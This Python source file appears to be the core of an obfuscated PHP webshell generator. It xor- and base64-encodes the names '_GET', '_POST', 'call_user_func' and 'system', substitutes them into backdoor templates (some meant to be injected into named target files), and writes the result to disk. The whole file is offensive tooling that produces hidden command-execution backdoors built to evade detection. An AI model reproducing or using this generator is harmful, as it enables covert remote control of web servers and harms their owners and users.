import base64
from encrypt import *
from template import *

keys = ['_GET','_POST','call_user_func','system']
encrypt_s = ['xor2','xor2_base64']

class Constructor:
    def __init__(self,template_type,encrypt_key,targets):
        self.template = globals()[template_type]
        self.key = encrypt_key
        self.targets = targets if "inject" in template_type else False
        self.values = {}

    def _prepare(self):
        for k in keys:
            self.values[k] = globals()[self.key](k)

        if self.targets != False:
            target = '|'.join(self.targets)
            self.values["filenames"] = base64.encodebytes(target.encode('utf-8')).decode('utf-8').strip('\n')

    def get_template(self):
        self._prepare()
        for k,v in self.values.items():
            self.template = self.template.replace(k,v)

        return self.template

    def generate(self,filename):
        with open(filename,'w+') as fi:
            fi.write(self.get_template())

class ConstructorXorN(Constructor):
    def __init__(self,template_type,encrypt_key,forN,tname):
        super(ConstructorXorN, self).__init__(template_type,encrypt_key,tname)
        self.forN = forN[0]

    def _prepare(self):
        for k in keys:
            self.values[k] = globals()[self.key](k,self.forN)

        if self.targets != False:
            target = '|'.join(self.targets).encode('utf-8')
            self.values["filename"] = base64.encodebytes(target).decode('utf-8')

    def get_template(self):
        self._prepare()
        for k,v in self.values.items():
            self.template = self.template.replace(k,v)

        return self.template